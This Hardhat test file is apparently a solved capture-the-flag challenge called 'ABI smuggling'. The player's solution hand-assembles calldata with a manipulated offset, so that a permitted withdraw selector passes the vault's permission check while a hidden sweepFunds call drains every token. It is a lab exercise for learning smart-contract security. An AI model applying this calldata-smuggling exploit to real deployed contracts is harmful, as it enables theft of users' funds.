const { ethers } = require('hardhat');
const { expect } = require('chai');
const { parseUnits, defaultAbiCoder } = require('ethers/lib/utils');
const { time } = require('@nomicfoundation/hardhat-network-helpers');

describe('[Challenge] ABI smuggling', function () {
  let deployer, player, recovery;
  let token, vault;

  const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player, recovery] = await ethers.getSigners();

    // Deploy Damn Valuable Token contract
    token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

    // Deploy Vault
    vault = await (await ethers.getContractFactory('SelfAuthorizedVault', deployer)).deploy();
    expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

    // Set permissions
    const deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address);
    const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address);
    await vault.setPermissions([deployerPermission, playerPermission]);
    expect(await vault.permissions(deployerPermission)).to.be.true;
    expect(await vault.permissions(playerPermission)).to.be.true;

    // Make sure Vault is initialized
    expect(await vault.initialized()).to.be.true;

    // Deposit tokens into the vault
    await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

    expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
    expect(await token.balanceOf(player.address)).to.eq(0);

    // Cannot call Vault directly
    await expect(vault.sweepFunds(deployer.address, token.address)).to.be.revertedWithCustomError(
      vault,
      'CallerNotAllowed'
    );
    await expect(
      vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)
    ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
    vault.interface.encodeFunctionData;
  });

  it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */
    let withdrawSig = '0xd9caed12';
    let executeSig = '0x1cff79cd';
    let sweepFunds = vault.interface.encodeFunctionData('sweepFunds', [recovery.address, token.address]);
    let offset = defaultAbiCoder.encode(['uint256'], [100]); //96 + 4

    let call =
      executeSig +
      defaultAbiCoder.encode(['address'], [vault.address]).substring(2) +
      offset.substring(2) +
      defaultAbiCoder.encode(['uint256'], [0]).substring(2) +
      withdrawSig.substring(2) +
      defaultAbiCoder.encode(['uint256'], [68]).substring(2) + //size of sweepfunds 4+32*2
      sweepFunds.substring(2);

    console.log(call);

    const tx = await (await player.sendTransaction({ to: vault.address, data: call, value: '0' })).wait();
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
    expect(await token.balanceOf(vault.address)).to.eq(0);
    expect(await token.balanceOf(player.address)).to.eq(0);
    expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
  });
});
